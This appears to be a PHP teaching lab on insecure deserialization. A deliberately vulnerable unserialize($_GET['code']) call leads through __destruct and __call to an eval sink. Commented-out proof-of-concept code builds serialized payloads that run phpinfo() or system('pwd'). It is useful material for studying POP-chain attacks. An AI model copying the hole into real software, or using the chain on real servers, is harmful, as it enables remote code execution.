<?php

class Woniu {
    private $a;
    function __construct(){
        $this->a = new Test();
    }
    function __destruct(){
        $this->a->hello();
    }
}
class Test {
    function hello(){
        echo "Hello World.";
    }
}
class Vul {
    protected $data;
    function hi(){   //方法名不一样，链断开
//     function hello(){
        @eval($this->data);   //目标利用点
    }
    function __call($name, $args){   //跳板，不存在方法时，调用此魔术方法
        $this->hi();
    }
}
    
// new Woniu();
unserialize($_GET['code']);   //url编码会自动解开
// unserialize(base64_decode($_GET['code']));    //base64须解码


//针对上述代码中的类型进行POC构造
// class Woniu {
//     var $a;
//     function __construct(){
//         $this->a = new Vul();
//     }
//     function __destruct(){
//         $this->a->hello();
//     }
// }
// class Vul {
//     var $data = "phpinfo();";
//     function hello(){
//         @eval($this->data);
//     }
// }

// echo serialize(new Woniu());


//最简化的poc
//只需要关注属性值构造pop
// class Woniu {
//     private $a;
//     function __construct(){
//         $this->a = new Vul();
//     }
// }
// class Vul {
// //     protected $data = 'phpinfo();';
//     protected $data = "system('pwd');";
// }

// // echo serialize(new Woniu());
// echo urlencode(serialize(new Woniu()));
// // echo base64_encode(serialize(new Woniu()));